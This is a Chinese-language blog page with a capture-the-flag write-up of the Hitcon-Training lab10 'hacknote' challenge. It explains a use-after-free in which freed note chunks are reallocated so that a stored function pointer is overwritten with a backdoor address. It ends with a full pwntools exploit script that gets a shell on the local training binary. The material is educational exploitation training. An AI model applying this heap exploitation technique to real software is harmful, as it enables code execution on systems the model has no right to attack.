@@ -1,0 +1,199 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hitcon-Training-lab10 - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="首先看一下保护：接下来放入ida查看：依旧是一个比较经典的菜单题，有malloc、free、print的功能。接下来分别看一下这三个功能：可以看到他在malloc（size）前先malloc了一个0,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Hitcon-Training-lab10</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">Hitcon-Training-lab10</h1>
+        <div class="stuff">
+            <span>十月 03, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>首先看一下保护：<br><img src="https://i.loli.net/2019/10/03/q7H2uYgCWwisjDP.jpg" alt="661B0003C2A543348F2B896F12645F0A.jpg"><br>接下来放入ida查看：<br><img src="https://i.loli.net/2019/10/03/hqSkuARPQ3mzGJO.jpg" alt="6DAD60B1BC644971B956C42D38BE72C9.jpg"><br>依旧是一个比较经典的菜单题，有malloc、free、print的功能。<br>接下来分别看一下这三个功能：<br><img src="https://i.loli.net/2019/10/03/lPhoUQAMawXpT7g.jpg" alt="759DC9EBDE524C1B9D6EFA53954EE1FB.jpg"><br>可以看到他在malloc（size）前先malloc了一个0x8大的空间，这是干什么的呢？这里让它指向了一个函数。<br><img src="https://i.loli.net/2019/10/03/8VmdTNxPzlZahpU.jpg" alt="85E9D6EF45C84264B37FAF06186D1650.jpg"><br>现在不好理解的话，可以结合print功能：<br><img src="https://i.loli.net/2019/10/03/dMgjnUe9yZ4YKpP.jpg" alt="A5308721B3C34B30A58F3D8E27BFF58E.jpg"><br>在最后输出的时候调用了第一次malloc的空间指向的函数。      </p>
+<p><strong>稍微总结一下现在已知的内容：</strong><br>首先每次选择add_noted的时候，相当于malloc了两个空间，8字节的那一个空间用来存储一个函数指针，另一个空间才是根据我们输入的size，malloc的空间。所以这里我们想到使用UAF。         </p>
+<p><img src="https://i.loli.net/2019/10/03/WC4zvNUjabrA6TK.png" alt="1.png"><br><img src="https://i.loli.net/2019/10/03/cVyKCNHLTaWAY4i.png" alt="2.png"><br>如果我们在free掉chunk1、chunk2之后add_note一个8自己大小的note，那么首先chunk2就会分配给add_note的第一个malloc，而接下来的malloc因为大小是8字节，glibc malloc就会把chunk1分配给他，这样我们将他的地址修改为后门函数地址，之后选择print功能，就可以实现get shell的目的。<br>最后附上exp    </p>
+<pre><code class="python">from pwn import *
+context(os=&#39;linux&#39; , arch = &#39;amd64&#39; , log_level= &#39;debug&#39;)
+p=process(&#39;./hacknote&#39;)
+magic=0x08048986
+def debug(msg=&#39;&#39;):
+    gdb.attach(p,&#39;&#39;)
+    pause()
+def add(size,content):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&#39;Note size :&#39;)
+    p.sendline(str(size))
+    p.recvuntil(&#39;Content :&#39;)
+    p.sendline(content)
+def printf(index):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(index))
+def delete(index):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(index))
+def exit():
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;4&#39;)
+#debug()
+add(0x20,&#39;a&#39;*4)
+add(0x20,&#39;b&#39;*4)
+add(0x20,&#39;c&#39;*4)
+delete(0)
+delete(1)
+add(0x8,p32(magic))
+printf(0)
+p.interactive()
+</code></pre>
+<p>结束。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/nito.model.json"},"display":{"position":"lift","width":200,"height":350},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
